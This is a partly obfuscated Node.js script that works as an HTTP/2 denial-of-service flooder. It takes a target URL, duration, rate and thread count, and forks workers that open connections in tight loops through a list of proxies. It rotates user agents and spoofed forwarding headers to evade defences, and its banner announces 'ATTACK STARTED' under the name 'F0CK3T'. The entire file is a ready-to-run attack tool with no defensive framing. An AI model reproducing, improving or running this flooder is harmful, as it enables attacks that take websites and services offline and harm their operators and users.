const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require('cluster');
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
if (process.argv.length < 0x5) {
  console.log("example: url time rps thread");
  process.exit();
}
const cplist = ["RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const headers = {};
const secureContextOptions = {
  'ciphers': cipper,
  'sigalgs': "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': "TLS_client_method"
};
const secureContext = tls.createSecureContext(secureContextOptions);
var proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/);
var userAgents = fs.readFileSync("ua.txt", "utf-8").toString().split(/\r?\n/);
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5]
};
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
  console.clear();
  console.log("\n     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n       TARGET : " + parsedTarget.host + "\n       DURATION : " + args.time + "\n       THREADS : " + args.threads + "\n       RPS : " + args.Rate + "\n     ┣━━━━━━━━━━━━━━━     ATTACK STARTED     ━━━━━━━━━━━━━━━━━┫\n             THIS METHOD [F0CK3T] IS MADE BY F0CK3T!\n     ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n");
  setTimeout(() => {
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
} else {
  for (let i = 0x0; i < 0xa; i++) {
    setInterval(runFlooder, 0x0);
  }
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x5db3b6, _0x207d79) {
    const _0x1677b4 = "CONNECT " + _0x5db3b6.address + ":443 HTTP/1.1\r\nHost: " + _0x5db3b6.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x402b4a = new Buffer.from(_0x1677b4);
    const _0x25c55b = net.connect({
      'host': _0x5db3b6.host,
      'port': _0x5db3b6.port,
      'allowHalfOpen': true,
      'writable': true,
      'readable': true
    });
    _0x25c55b.setTimeout(_0x5db3b6.timeout * 0x2710);
    _0x25c55b.setKeepAlive(true, 0x2710);
    _0x25c55b.setNoDelay(true);
    _0x25c55b.on('connect', () => {
      _0x25c55b.write(_0x402b4a);
    });
    _0x25c55b.on("data", _0x247e41 => {
      const _0x30289d = _0x247e41.toString("utf-8");
      const _0x4e10bd = _0x30289d.includes("HTTP/1.1 200");
      if (_0x4e10bd === false) {
        _0x25c55b.destroy();
        return _0x207d79(undefined, "error: invalid response from proxy server");
      }
      return _0x207d79(_0x25c55b, undefined);
    });
    _0x25c55b.on('timeout', () => {
      _0x25c55b.destroy();
      return _0x207d79(undefined, "error: timeout exceeded");
    });
    _0x25c55b.on("error", _0x3173df => {
      _0x25c55b.destroy();
      return _0x207d79(undefined, "error: " + _0x3173df);
    });
  }
}
const Socker = new NetSocket();
function readLines(_0x2cb87d) {
  return fs.readFileSync(_0x2cb87d, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x3fe050, _0x28fecc) {
  return Math.floor(Math.random() * (_0x28fecc - _0x3fe050) + _0x3fe050);
}
function randomElement(_0x532bda) {
  return _0x532bda[Math.floor(Math.random() * (_0x532bda.length - 0x0) + 0x0)];
}
function randomCharacters(_0x293671) {
  output = '';
  for (let _0x6b6de5 = 0x0; _0x6b6de5 < _0x293671; _0x6b6de5++) {
    output += characters[Math.floor(Math.random() * (characters.length - 0x0) + 0x0)];
  }
  return output;
}
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*;q=0.8';
headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
headers["accept-encoding"] = "gzip, deflate, br";
headers['x-forwarded-proto'] = "https";
headers['cache-control'] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = ['?0', '?1'][Math.floor(Math.random() * (['?0', '?1'].length - 0x0) + 0x0)];
headers["sec-ch-ua-platform"] = ["Android", "iOS", "Linux", "macOS", "Windows"][Math.floor(Math.random() * (["Android", "iOS", "Linux", "macOS", "Windows"].length - 0x0) + 0x0)];
headers["sec-fetch-dest"] = 'document';
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = '1';
function runFlooder() {
  const _0x1e8027 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x2ef7b9 = _0x1e8027.split(':');
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = userAgents[Math.floor(Math.random() * (userAgents.length - 0x0) + 0x0)];
  headers["x-forwarded-for"] = _0x2ef7b9[0x0];
  const _0x4c60b8 = {
    'host': _0x2ef7b9[0x0],
    'port': ~~_0x2ef7b9[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0xf
  };
  Socker.HTTP(_0x4c60b8, (_0x23b423, _0x1c3b52) => {
    if (_0x1c3b52) {
      return;
    }
    _0x23b423.setKeepAlive(true, 0xea60);
    _0x23b423.setNoDelay(true);
    const _0x11839c = {
      'enablePush': false,
      'initialWindowSize': 0x3fffffff
    };
    const _0x24533b = {
      'port': 0x1bb,
      'secure': true,
      'ALPNProtocols': ['h2', "http/1.1", 'h3', "http/2+quic/43", "http/2+quic/44", 'http/2+quic/45'],
      'ciphers': cipper,
      'sigalgs': "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      'requestCert': true,
      'socket': _0x23b423,
      'ecdhCurve': "GREASE:x25519:secp256r1:secp384r1",
      'honorCipherOrder': true,
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'clientCertEngine': "dynamic",
      'secureOptions': secureOptions,
      'secureContext': secureContext,
      'servername': parsedTarget.host,
      'secureProtocol': "TLS_client_method"
    };
    const _0x585201 = tls.connect(0x1bb, parsedTarget.host, _0x24533b);
    _0x585201.allowHalfOpen = true;
    _0x585201.setNoDelay(true);
    _0x585201.setKeepAlive(true, 60000);
    _0x585201.setMaxListeners(0x0);
    const _0x5a1730 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': _0x11839c,
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x585201
    });
    _0x5a1730.setMaxListeners(0x0);
    _0x5a1730.settings(_0x11839c);
    _0x5a1730.on("connect", () => {});
    _0x5a1730.on("close", () => {
      _0x5a1730.destroy();
      _0x23b423.destroy();
      return;
    });
    _0x5a1730.on('error', _0x2b8683 => {
      _0x5a1730.destroy();
      _0x23b423.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);
process.on("uncaughtException", _0xb0473f => {});
process.on('unhandledRejection', _0x4035f9 => {});
